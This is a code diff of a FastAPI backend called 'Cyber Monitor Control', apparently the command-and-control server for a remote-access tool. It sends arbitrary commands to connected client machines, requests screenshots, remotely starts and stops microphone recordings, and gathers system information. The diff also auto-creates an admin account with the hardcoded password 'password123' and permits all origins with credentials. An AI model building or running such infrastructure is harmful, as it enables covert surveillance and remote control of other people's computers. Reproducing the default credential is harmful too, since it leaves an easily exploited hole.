@@ -1,10 +1,9 @@
-# backend/main.py
 import os
-from fastapi import FastAPI, HTTPException, Depends, WebSocket, Request, status
+from fastapi import FastAPI, HTTPException, Depends, WebSocket, WebSocketDisconnect, Request, status
 from fastapi.middleware.cors import CORSMiddleware
 from fastapi.security import HTTPBearer, HTTPAuthorizationCredentials
 from pydantic import BaseModel
-from typing import List, Dict, Optional
+from typing import List, Dict, Optional, Any
 import uvicorn
 from datetime import datetime, timedelta
 import secrets
@@ -13,26 +12,31 @@ from supabase import create_client, Client
 from dotenv import load_dotenv
 import jwt
 import bcrypt
+import base64
+import asyncio
 
 # Load environment
 load_dotenv()
 
-app = FastAPI(title="Cyber Monitor Control", version="3.0")
+app = FastAPI(
+    title="Cyber Monitor Control",
+    version="3.0",
+    description="Client monitoring and management system"
+)
 
-# CORS
+# CORS Configuration
 app.add_middleware(
     CORSMiddleware,
-    allow_origins=["*"],
+    allow_origins=["*"],  # Allow all origins (adjust for production)
     allow_credentials=True,
     allow_methods=["*"],
     allow_headers=["*"],
 )
 
 # ========== ENVIRONMENT VARIABLES ==========
-SUPABASE_URL = os.getenv("SUPABASE_URL")
-SUPABASE_KEY = os.getenv("SUPABASE_KEY")
+SUPABASE_URL = os.getenv("SUPABASE_URL", "")
+SUPABASE_KEY = os.getenv("SUPABASE_KEY", "")
 JWT_SECRET_KEY = os.getenv("JWT_SECRET_KEY", secrets.token_urlsafe(32))
-ADMIN_INITIAL_PASSWORD = os.getenv("ADMIN_INITIAL_PASSWORD", "password123")
 
 # Initialize Supabase
 supabase: Optional[Client] = None
@@ -56,15 +60,20 @@ class CommandRequest(BaseModel):
     command: str
     parameters: Dict = {}
 
-# ========== HELPER FUNCTIONS ==========
-def get_supabase() -> Client:
-    """Get Supabase client"""
-    if supabase is None:
-        raise HTTPException(
-            status_code=500,
-            detail="Database not initialized"
-        )
-    return supabase
+class LogEntry(BaseModel):
+    client_id: str
+    log_type: str
+    message: str
+
+class AudioUpload(BaseModel):
+    client_id: str
+    audio_data: str  # base64 encoded
+    filename: str
+
+class ScreenshotUpload(BaseModel):
+    client_id: str
+    image_data: str  # base64 encoded
+    filename: str
 
 # ========== SECURITY FUNCTIONS ==========
 def hash_password(password: str) -> str:
@@ -106,7 +115,7 @@ async def authenticate_user(credentials: HTTPAuthorizationCredentials = Depends(
     
     if not payload:
         raise HTTPException(
-            status_code=401,
+            status_code=status.HTTP_401_UNAUTHORIZED,
             detail="Invalid authentication credentials",
             headers={"WWW-Authenticate": "Bearer"},
         )
@@ -120,34 +129,116 @@ async def startup_event():
     global supabase
     
     try:
-        # Validate environment variables
-        if not SUPABASE_URL:
-            print("❌ SUPABASE_URL must be set in environment variables")
-            return
-            
-        if not SUPABASE_KEY:
-            print("❌ SUPABASE_KEY must be set in environment variables")
+        if not SUPABASE_URL or not SUPABASE_KEY:
+            print("⚠️  Supabase credentials not set")
             return
         
         print(f"🔗 Initializing Supabase connection...")
-        
-        # Initialize Supabase client
         supabase_client = create_client(SUPABASE_URL, SUPABASE_KEY)
         
-        # Test connection with a simple query
+        # Test connection
         try:
             response = supabase_client.table("users").select("count", count="exact").limit(1).execute()
-            print("✅ Database connection successful")
-            global supabase
-            supabase = supabase_client
-        except Exception as e:
-            print(f"❌ Database connection failed: {str(e)}")
-            print("⚠️  Make sure you've created the tables using the SQL provided")
+            print(f"✅ Database connected: {len(response.data)} users found")
             
+            # Check if admin user exists, create if not
+            admin_email = "admin@system.io"
+            admin_res = supabase_client.table("users").select("*").eq("email", admin_email).execute()
+            
+            if not admin_res.data:
+                hashed_pw = hash_password("password123")
+                supabase_client.table("users").insert({
+                    "email": admin_email,
+                    "password_hash": hashed_pw,
+                    "is_admin": True,
+                    "is_active": True,
+                    "created_at": datetime.utcnow().isoformat()
+                }).execute()
+                print(f"✅ Created admin user: {admin_email}")
+            
+        except Exception as e:
+            print(f"❌ Database test failed: {str(e)}")
+            print("💡 Make sure you've created the tables in Supabase")
+            return
+        
+        supabase = supabase_client
+        
     except Exception as e:
         print(f"❌ Startup error: {str(e)}")
         import traceback
         traceback.print_exc()
+
+# ========== WEBSOCKET MANAGER ==========
+class ConnectionManager:
+    def __init__(self):
+        self.active_connections: Dict[str, WebSocket] = {}
+        self.client_connections: Dict[str, WebSocket] = {}
+        self.admin_connections: List[WebSocket] = []
+
+    async def connect_admin(self, websocket: WebSocket):
+        await websocket.accept()
+        self.admin_connections.append(websocket)
+
+    async def connect_client(self, websocket: WebSocket, client_id: str):
+        await websocket.accept()
+        self.client_connections[client_id] = websocket
+        
+        # Notify admins
+        await self.notify_admins({
+            "type": "client_connected",
+            "client_id": client_id,
+            "timestamp": datetime.utcnow().isoformat()
+        })
+
+    def disconnect(self, websocket: WebSocket):
+        # Remove from admin connections
+        if websocket in self.admin_connections:
+            self.admin_connections.remove(websocket)
+        
+        # Remove from client connections
+        client_id = None
+        for cid, ws in self.client_connections.items():
+            if ws == websocket:
+                client_id = cid
+                break
+        
+        if client_id:
+            del self.client_connections[client_id]
+            # Notify admins
+            asyncio.create_task(self.notify_admins({
+                "type": "client_disconnected",
+                "client_id": client_id,
+                "timestamp": datetime.utcnow().isoformat()
+            }))
+
+    async def notify_admins(self, message: dict):
+        """Send message to all admin connections"""
+        disconnected = []
+        for connection in self.admin_connections:
+            try:
+                await connection.send_json(message)
+            except:
+                disconnected.append(connection)
+        
+        # Remove disconnected admins
+        for connection in disconnected:
+            if connection in self.admin_connections:
+                self.admin_connections.remove(connection)
+
+    async def send_to_client(self, client_id: str, message: dict):
+        """Send message to specific client"""
+        if client_id in self.client_connections:
+            try:
+                await self.client_connections[client_id].send_json(message)
+                return True
+            except:
+                # Remove disconnected client
+                if client_id in self.client_connections:
+                    del self.client_connections[client_id]
+                return False
+        return False
+
+manager = ConnectionManager()
 
 # ========== ROUTES ==========
 @app.post("/api/login")
@@ -192,7 +283,7 @@ async def login(data: LoginRequest):
                 .eq("id", user["id"]) \
                 .execute()
         except:
-            pass  # Optional update
+            pass
         
         return {
             "success": True,
@@ -217,8 +308,8 @@ async def register_client(data: ClientRegister, request: Request):
             raise HTTPException(status_code=500, detail="Database not initialized")
         
         # Get client IP from request
-        if not data.ip_address:
-            data.ip_address = request.client.host if request.client else "127.0.0.1"
+        if not data.ip_address or data.ip_address == "127.0.0.1":
+            data.ip_address = request.client.host if request.client else "Unknown"
         
         # Check if client exists
         response = supabase.table("clients") \
@@ -232,7 +323,8 @@ async def register_client(data: ClientRegister, request: Request):
             "ip_address": data.ip_address,
             "os_info": data.os_info,
             "last_seen": datetime.utcnow().isoformat(),
-            "online": True
+            "online": True,
+            "registered_at": datetime.utcnow().isoformat()
         }
         
         if response.data:
@@ -254,12 +346,17 @@ async def register_client(data: ClientRegister, request: Request):
             supabase.table("logs").insert({
                 "client_id": client_id,
                 "log_type": "info",
-                "message": f"Client registered: {data.name}"
+                "message": f"Client registered: {data.name} ({data.client_id})",
+                "created_at": datetime.utcnow().isoformat()
             }).execute()
         except Exception as e:
             print(f"Log insertion error: {str(e)}")
         
-        return {"success": True, "message": "Client registered"}
+        return {
+            "success": True, 
+            "message": "Client registered",
+            "client_id": data.client_id
+        }
         
     except Exception as e:
         print(f"Client registration error: {str(e)}")
@@ -282,44 +379,125 @@ async def get_clients(_: dict = Depends(authenticate_user)):
         print(f"Get clients error: {str(e)}")
         raise HTTPException(status_code=500, detail=str(e))
 
+@app.get("/api/client/{client_id}")
+async def get_client(client_id: str, _: dict = Depends(authenticate_user)):
+    """Get specific client"""
+    try:
+        if supabase is None:
+            raise HTTPException(status_code=500, detail="Database not initialized")
+        
+        response = supabase.table("clients") \
+            .select("*") \
+            .eq("client_id", client_id) \
+            .execute()
+        
+        if not response.data:
+            raise HTTPException(status_code=404, detail="Client not found")
+        
+        return {"success": True, "client": response.data[0]}
+    except HTTPException:
+        raise
+    except Exception as e:
+        print(f"Get client error: {str(e)}")
+        raise HTTPException(status_code=500, detail=str(e))
+
 @app.get("/api/commands")
-async def get_commands(_: dict = Depends(authenticate_user), limit: int = 50):
+async def get_commands(
+    _: dict = Depends(authenticate_user),
+    client_id: Optional[str] = None,
+    limit: int = 50
+):
     """Get recent commands"""
     try:
         if supabase is None:
             raise HTTPException(status_code=500, detail="Database not initialized")
         
-        response = supabase.table("commands") \
+        query = supabase.table("commands") \
             .select("*, clients(client_id, name)") \
             .order("created_at", desc=True) \
-            .limit(limit) \
-            .execute()
+            .limit(limit)
         
+        if client_id:
+            client_res = supabase.table("clients") \
+                .select("id") \
+                .eq("client_id", client_id) \
+                .execute()
+            if client_res.data:
+                query = query.eq("client_id", client_res.data[0]["id"])
+        
+        response = query.execute()
         return {"success": True, "commands": response.data}
     except Exception as e:
         print(f"Get commands error: {str(e)}")
         raise HTTPException(status_code=500, detail=str(e))
 
 @app.get("/api/screenshots")
-async def get_screenshots(_: dict = Depends(authenticate_user), limit: int = 10):
+async def get_screenshots(
+    _: dict = Depends(authenticate_user),
+    client_id: Optional[str] = None,
+    limit: int = 12
+):
     """Get recent screenshots"""
     try:
         if supabase is None:
             raise HTTPException(status_code=500, detail="Database not initialized")
         
-        response = supabase.table("screenshots") \
+        query = supabase.table("screenshots") \
             .select("*, clients(client_id, name)") \
             .order("created_at", desc=True) \
-            .limit(limit) \
-            .execute()
+            .limit(limit)
         
+        if client_id:
+            client_res = supabase.table("clients") \
+                .select("id") \
+                .eq("client_id", client_id) \
+                .execute()
+            if client_res.data:
+                query = query.eq("client_id", client_res.data[0]["id"])
+        
+        response = query.execute()
         return {"success": True, "screenshots": response.data}
     except Exception as e:
         print(f"Get screenshots error: {str(e)}")
         raise HTTPException(status_code=500, detail=str(e))
 
+@app.get("/api/audio")
+async def get_audio(
+    _: dict = Depends(authenticate_user),
+    client_id: Optional[str] = None,
+    limit: int = 10
+):
+    """Get recent audio recordings"""
+    try:
+        if supabase is None:
+            raise HTTPException(status_code=500, detail="Database not initialized")
+        
+        query = supabase.table("audio_recordings") \
+            .select("*, clients(client_id, name)") \
+            .order("created_at", desc=True) \
+            .limit(limit)
+        
+        if client_id:
+            client_res = supabase.table("clients") \
+                .select("id") \
+                .eq("client_id", client_id) \
+                .execute()
+            if client_res.data:
+                query = query.eq("client_id", client_res.data[0]["id"])
+        
+        response = query.execute()
+        return {"success": True, "audio_recordings": response.data}
+    except Exception as e:
+        print(f"Get audio error: {str(e)}")
+        raise HTTPException(status_code=500, detail=str(e))
+
 @app.get("/api/logs")
-async def get_logs(_: dict = Depends(authenticate_user), client_id: Optional[str] = None, limit: int = 100):
+async def get_logs(
+    _: dict = Depends(authenticate_user),
+    client_id: Optional[str] = None,
+    log_type: Optional[str] = None,
+    limit: int = 100
+):
     """Get system logs"""
     try:
         if supabase is None:
@@ -337,6 +515,9 @@ async def get_logs(_: dict = Depends(authenticate_user), client_id: Optional[str
                 .execute()
             if client_res.data:
                 query = query.eq("client_id", client_res.data[0]["id"])
+        
+        if log_type and log_type != "all":
+            query = query.eq("log_type", log_type)
         
         response = query.execute()
         return {"success": True, "logs": response.data}
@@ -365,21 +546,32 @@ async def send_command(data: CommandRequest, _: dict = Depends(authenticate_user
             "client_id": client_res.data[0]["id"],
             "command": data.command,
             "parameters": data.parameters,
-            "status": "pending"
+            "status": "pending",
+            "created_at": datetime.utcnow().isoformat()
         }).execute()
         
-        # Try to send via WebSocket
-        try:
-            await manager.send_to_client(data.client_id, {
-                "type": "command",
-                "command_id": command_res.data[0]["id"],
-                "command": data.command,
-                "parameters": data.parameters
-            })
-        except Exception as e:
-            print(f"WebSocket send error: {str(e)}")
+        command_id = command_res.data[0]["id"]
         
-        return {"success": True, "command_id": command_res.data[0]["id"]}
+        # Try to send via WebSocket
+        sent = await manager.send_to_client(data.client_id, {
+            "type": "command",
+            "command_id": command_id,
+            "command": data.command,
+            "parameters": data.parameters
+        })
+        
+        if not sent:
+            # Update command status if WebSocket failed
+            supabase.table("commands") \
+                .update({"status": "failed", "error": "Client not connected"}) \
+                .eq("id", command_id) \
+                .execute()
+        
+        return {
+            "success": True,
+            "command_id": command_id,
+            "sent_via_websocket": sent
+        }
         
     except HTTPException:
         raise
@@ -391,20 +583,26 @@ async def send_command(data: CommandRequest, _: dict = Depends(authenticate_user
 async def request_screenshot(client_id: str, _: dict = Depends(authenticate_user)):
     """Request screenshot from client"""
     try:
-        # Try to send via WebSocket
-        try:
-            await manager.send_to_client(client_id, {
-                "type": "screenshot_request"
-            })
-        except:
-            pass
+        # Send via WebSocket
+        sent = await manager.send_to_client(client_id, {
+            "type": "screenshot_request"
+        })
         
-        return {"success": True, "message": "Screenshot request sent"}
+        if sent:
+            return {
+                "success": True,
+                "message": "Screenshot request sent"
+            }
+        else:
+            raise HTTPException(status_code=404, detail="Client not connected")
+            
+    except HTTPException:
+        raise
     except Exception as e:
         raise HTTPException(status_code=500, detail=str(e))
 
 @app.post("/api/upload-screenshot")
-async def upload_screenshot(client_id: str, image_data: str, _: dict = Depends(authenticate_user)):
+async def upload_screenshot(data: ScreenshotUpload, _: dict = Depends(authenticate_user)):
     """Upload screenshot from client"""
     try:
         if supabase is None:
@@ -413,62 +611,137 @@ async def upload_screenshot(client_id: str, image_data: str, _: dict = Depends(a
         # Get client ID
         client_res = supabase.table("clients") \
             .select("id") \
-            .eq("client_id", client_id) \
+            .eq("client_id", data.client_id) \
             .execute()
         
         if not client_res.data:
             raise HTTPException(status_code=404, detail="Client not found")
         
         # Store screenshot
-        supabase.table("screenshots").insert({
+        screenshot_res = supabase.table("screenshots").insert({
             "client_id": client_res.data[0]["id"],
-            "image_data": image_data
+            "image_data": data.image_data,
+            "filename": data.filename,
+            "created_at": datetime.utcnow().isoformat()
         }).execute()
         
-        return {"success": True}
+        # Notify admins
+        await manager.notify_admins({
+            "type": "screenshot_received",
+            "client_id": data.client_id,
+            "screenshot_id": screenshot_res.data[0]["id"],
+            "filename": data.filename,
+            "timestamp": datetime.utcnow().isoformat()
+        })
+        
+        return {"success": True, "screenshot_id": screenshot_res.data[0]["id"]}
+        
+    except HTTPException:
+        raise
+    except Exception as e:
+        print(f"Screenshot upload error: {str(e)}")
+        raise HTTPException(status_code=500, detail=str(e))
+
+@app.post("/api/upload-audio")
+async def upload_audio(data: AudioUpload, _: dict = Depends(authenticate_user)):
+    """Upload audio recording from client"""
+    try:
+        if supabase is None:
+            raise HTTPException(status_code=500, detail="Database not initialized")
+        
+        # Get client ID
+        client_res = supabase.table("clients") \
+            .select("id") \
+            .eq("client_id", data.client_id) \
+            .execute()
+        
+        if not client_res.data:
+            raise HTTPException(status_code=404, detail="Client not found")
+        
+        # Store audio
+        audio_res = supabase.table("audio_recordings").insert({
+            "client_id": client_res.data[0]["id"],
+            "audio_data": data.audio_data,
+            "filename": data.filename,
+            "created_at": datetime.utcnow().isoformat()
+        }).execute()
+        
+        # Notify admins
+        await manager.notify_admins({
+            "type": "audio_received",
+            "client_id": data.client_id,
+            "audio_id": audio_res.data[0]["id"],
+            "filename": data.filename,
+            "timestamp": datetime.utcnow().isoformat()
+        })
+        
+        return {"success": True, "audio_id": audio_res.data[0]["id"]}
+        
+    except HTTPException:
+        raise
+    except Exception as e:
+        print(f"Audio upload error: {str(e)}")
+        raise HTTPException(status_code=500, detail=str(e))
+
+@app.post("/api/audio/{client_id}/record")
+async def record_audio(client_id: str, duration: int = 10, _: dict = Depends(authenticate_user)):
+    """Request audio recording from client"""
+    try:
+        # Send via WebSocket
+        sent = await manager.send_to_client(client_id, {
+            "type": "audio_record",
+            "duration": duration
+        })
+        
+        if sent:
+            return {
+                "success": True,
+                "message": f"Audio recording requested for {duration} seconds"
+            }
+        else:
+            raise HTTPException(status_code=404, detail="Client not connected")
+            
+    except HTTPException:
+        raise
     except Exception as e:
         raise HTTPException(status_code=500, detail=str(e))
 
-# ========== WEBSOCKET MANAGER ==========
-class ConnectionManager:
-    def __init__(self):
-        self.active_connections: Dict[str, WebSocket] = {}
-        self.client_connections: Dict[str, WebSocket] = {}
+@app.post("/api/audio/{client_id}/stop")
+async def stop_audio(client_id: str, _: dict = Depends(authenticate_user)):
+    """Stop audio recording on client"""
+    try:
+        # Send via WebSocket
+        sent = await manager.send_to_client(client_id, {
+            "type": "audio_stop"
+        })
+        
+        if sent:
+            return {
+                "success": True,
+                "message": "Audio recording stopped"
+            }
+        else:
+            raise HTTPException(status_code=404, detail="Client not connected")
+            
+    except HTTPException:
+        raise
+    except Exception as e:
+        raise HTTPException(status_code=500, detail=str(e))
 
-    async def connect_admin(self, websocket: WebSocket):
-        await websocket.accept()
-        self.active_connections["admin"] = websocket
-
-    async def connect_client(self, websocket: WebSocket, client_id: str):
-        await websocket.accept()
-        self.client_connections[client_id] = websocket
-
-    def disconnect(self, client_id: str):
-        if client_id in self.active_connections:
-            del self.active_connections[client_id]
-        if client_id in self.client_connections:
-            del self.client_connections[client_id]
-
-    async def send_to_admin(self, message: dict):
-        if "admin" in self.active_connections:
-            await self.active_connections["admin"].send_json(message)
-
-    async def send_to_client(self, client_id: str, message: dict):
-        if client_id in self.client_connections:
-            await self.client_connections[client_id].send_json(message)
-
-manager = ConnectionManager()
-
+# ========== WEBSOCKET ENDPOINTS ==========
 @app.websocket("/ws/admin")
 async def websocket_admin(websocket: WebSocket):
     await manager.connect_admin(websocket)
     try:
         while True:
             data = await websocket.receive_json()
+            # Handle admin messages if needed
             print(f"Admin WebSocket message: {data}")
+    except WebSocketDisconnect:
+        manager.disconnect(websocket)
     except Exception as e:
         print(f"Admin WebSocket error: {str(e)}")
-        manager.disconnect("admin")
+        manager.disconnect(websocket)
 
 @app.websocket("/ws/client/{client_id}")
 async def websocket_client(websocket: WebSocket, client_id: str):
@@ -481,13 +754,14 @@ async def websocket_client(websocket: WebSocket, client_id: str):
                     "online": True,
                     "last_seen": datetime.utcnow().isoformat()
                 }).eq("client_id", client_id).execute()
-            except:
-                pass
+            except Exception as e:
+                print(f"Client status update error: {e}")
         
         while True:
             data = await websocket.receive_json()
+            data_type = data.get("type")
             
-            if data.get("type") == "heartbeat":
+            if data_type == "heartbeat":
                 # Update last seen
                 if supabase:
                     try:
@@ -498,7 +772,7 @@ async def websocket_client(websocket: WebSocket, client_id: str):
                     except:
                         pass
                 
-            elif data.get("type") == "command_result":
+            elif data_type == "command_result":
                 # Update command status
                 if supabase:
                     try:
@@ -510,7 +784,16 @@ async def websocket_client(websocket: WebSocket, client_id: str):
                     except:
                         pass
                 
-            elif data.get("type") == "log":
+                # Notify admins
+                await manager.notify_admins({
+                    "type": "command_result",
+                    "client_id": client_id,
+                    "command_id": data.get("command_id"),
+                    "result": data.get("result"),
+                    "timestamp": datetime.utcnow().isoformat()
+                })
+                
+            elif data_type == "log":
                 # Store log
                 if supabase:
                     try:
@@ -522,11 +805,56 @@ async def websocket_client(websocket: WebSocket, client_id: str):
                             supabase.table("logs").insert({
                                 "client_id": client_res.data[0]["id"],
                                 "log_type": data.get("log_type", "info"),
-                                "message": data.get("message", "")
+                                "message": data.get("message", ""),
+                                "created_at": datetime.utcnow().isoformat()
                             }).execute()
                     except:
                         pass
-                    
+                
+                # Notify admins
+                await manager.notify_admins({
+                    "type": "client_log",
+                    "client_id": client_id,
+                    "log_type": data.get("log_type", "info"),
+                    "message": data.get("message", ""),
+                    "timestamp": datetime.utcnow().isoformat()
+                })
+                
+            elif data_type == "system_info":
+                # Store system info
+                if supabase:
+                    try:
+                        client_res = supabase.table("clients") \
+                            .select("id") \
+                            .eq("client_id", client_id) \
+                            .execute()
+                        if client_res.data:
+                            supabase.table("system_info").insert({
+                                "client_id": client_res.data[0]["id"],
+                                "info": data.get("info", {}),
+                                "created_at": datetime.utcnow().isoformat()
+                            }).execute()
+                    except:
+                        pass
+                
+                # Notify admins
+                await manager.notify_admins({
+                    "type": "system_info",
+                    "client_id": client_id,
+                    "info": data.get("info", {}),
+                    "timestamp": datetime.utcnow().isoformat()
+                })
+                
+    except WebSocketDisconnect:
+        # Mark client as offline
+        if supabase:
+            try:
+                supabase.table("clients").update({
+                    "online": False
+                }).eq("client_id", client_id).execute()
+            except:
+                pass
+        manager.disconnect(websocket)
     except Exception as e:
         print(f"Client WebSocket error: {str(e)}")
         # Mark client as offline
@@ -537,8 +865,9 @@ async def websocket_client(websocket: WebSocket, client_id: str):
                 }).eq("client_id", client_id).execute()
             except:
                 pass
-        manager.disconnect(client_id)
+        manager.disconnect(websocket)
 
+# ========== HEALTH AND INFO ==========
 @app.get("/api/health")
 async def health_check():
     """Health check endpoint"""
@@ -546,10 +875,12 @@ async def health_check():
         "status": "healthy" if supabase else "unhealthy",
         "timestamp": datetime.utcnow().isoformat(),
         "version": "3.0",
-        "database": "connected" if supabase else "disconnected"
+        "database": "connected" if supabase else "disconnected",
+        "active_clients": len(manager.client_connections),
+        "active_admins": len(manager.admin_connections)
     }
     
-    # Test database connection if available
+    # Test database connection
     if supabase:
         try:
             supabase.table("users").select("count", count="exact").limit(1).execute()
@@ -565,21 +896,42 @@ async def root():
     return {
         "message": "Cyber Monitor Control API",
         "version": "3.0",
-        "docs": "/docs",
-        "health": "/api/health",
-        "database": "initialized" if supabase else "not initialized"
+        "status": "running",
+        "database": "connected" if supabase else "disconnected",
+        "endpoints": {
+            "login": "POST /api/login",
+            "register_client": "POST /api/register-client",
+            "clients": "GET /api/clients",
+            "commands": "GET /api/commands",
+            "screenshots": "GET /api/screenshots",
+            "audio": "GET /api/audio",
+            "logs": "GET /api/logs",
+            "health": "GET /api/health"
+        },
+        "websocket": {
+            "admin": "/ws/admin",
+            "client": "/ws/client/{client_id}"
+        }
     }
 
+# ========== MAIN ==========
 if __name__ == "__main__":
     port = int(os.getenv("PORT", 8000))
-    print(f"🚀 Starting server on port {port}")
-    print(f"🔗 Supabase URL: {SUPABASE_URL}")
-    print(f"🔑 JWT Secret: {'Set' if JWT_SECRET_KEY else 'Not set'}")
-    print(f"👑 Admin Password: {'Set' if ADMIN_INITIAL_PASSWORD else 'Using default'}")
+    print(f"🚀 Starting Cyber Monitor Control API")
+    print(f"📡 Port: {port}")
+    print(f"🔗 Supabase: {'Connected' if supabase else 'Disconnected'}")
+    print(f"👥 Active clients: 0")
+    print(f"💻 Admin panel: http://localhost:{port}")
     print("\n📋 Available endpoints:")
-    print(f"   • Login: POST /api/login")
-    print(f"   • Clients: GET /api/clients")
+    print(f"   • API Root: GET /")
     print(f"   • Health: GET /api/health")
+    print(f"   • Login: POST /api/login")
+    print(f"   • Register client: POST /api/register-client")
     print(f"   • Docs: http://localhost:{port}/docs")
     
-    uvicorn.run(app, host="0.0.0.0", port=port)
+    uvicorn.run(
+        app,
+        host="0.0.0.0",
+        port=port,
+        log_level="info"
+    )
